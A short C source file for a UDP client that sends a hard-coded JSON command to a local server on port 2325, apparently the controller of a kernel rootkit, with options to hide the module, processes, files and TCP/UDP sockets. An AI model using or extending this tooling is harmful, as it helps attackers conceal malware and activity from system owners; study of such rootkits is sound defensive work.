/************* UDP CLIENT CODE *******************/

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

#define BUFSIZE 1028

//char conf[BUFSIZE];
const char *JSON_STRING =
	"{"
		"\"hide_module\": true,"
		"\"unhide_module\": false,"

		//"\"hide_files\": [\"file_str_3\", \"file_str_2\"],"
		//"\"unhide_files\": [\"ufile_str_1\", \"ufile_str_2\"],"
		"\"hide_processes\": [\"1\"],"
		//"\"unhide_processes\": [\"1\"],"
		//"\"hide_sockets_tcp4\": [\"tcp4_port_int_1\", \"tcp4_port_int_2\"],"
		//"\"unhide_sockets_tcp4\": [\"tcp4_uport_int_1\", \"tcp4_uport_int_2\"],"
		//"\"hide_sockets_tcp6\": [\"tcp6_port_int_1\", \"tcp6_port_int_2\"],"
		//"\"unhide_sockets_tcp6\": [\"tcp6_uport_int_1\", \"tcp6_uport_int_2\"],"
		//"\"hide_sockets_udp4\": [\"udp4_port_int_1\", \"udp4_port_int_2\"],"
		//"\"unhide_sockets_udp4\": [\"udp4_uport_int_1\", \"udp4_uport_int_2\"],"
		//"\"hide_sockets_udp6\": [\"udp6_port_int_1\", \"udp6_port_int_2\"],"
		//"\"unhide_sockets_udp6\": [\"udp6_uport_int_1\", \"udp6_uport_int_2\"]"
	"}";


int main() {
	int clientSocket, portNum, nBytes;
	char buffer[BUFSIZE];
	struct sockaddr_in serverAddr;
	socklen_t addr_size;

	//read_conf_from_file();

	/* Create UDP socket */
	clientSocket = socket(PF_INET, SOCK_DGRAM, 0);

	/* Configure settings in address struct */
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(2325);
	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);  

	/*Initialize size variable to be used later on*/
	addr_size = sizeof serverAddr;


	//while(1) {
		//printf("Send new conf to server?:\n");
		//fgets(buffer, 1024, stdin);
		//printf("You typed: |%s|",buffer);

		//if (!strcmp(buffer, "no\n"))
		//	return 0;
		//else if (!strcmp(buffer, "yes\n")) {
		//nBytes = strlen(buffer) + 1;
    
			/* Send message to server */
			sendto(clientSocket, JSON_STRING, strlen(JSON_STRING), 0, (struct sockaddr *) &serverAddr, addr_size);
			printf("Sent to server:\n\n%s\n\n", JSON_STRING);

			/* Receive message from server */
			//nBytes = recvfrom(clientSocket, buffer, BUFSIZE, 0, NULL, NULL);

			//printf("Received from server: %s\n", buffer);
		//}
	//}

	return 0;
}


/*
int read_conf_from_file()
{
	FILE *fp;	
	char *file_name = "conf.txt";

	fp = fopen(file_name, "r");   // read mode
 
	if (fp == NULL) {
		perror("Error while opening the file.\n");
		return 1;
	}
 
	printf("The contents of %s file are :\n", file_name);

	fscanf(fp, "%s", conf);
	fgets(conf, 1028, fp);
	printf("%s\n", conf);
 
	fclose(fp);

	return 0;
}
*/

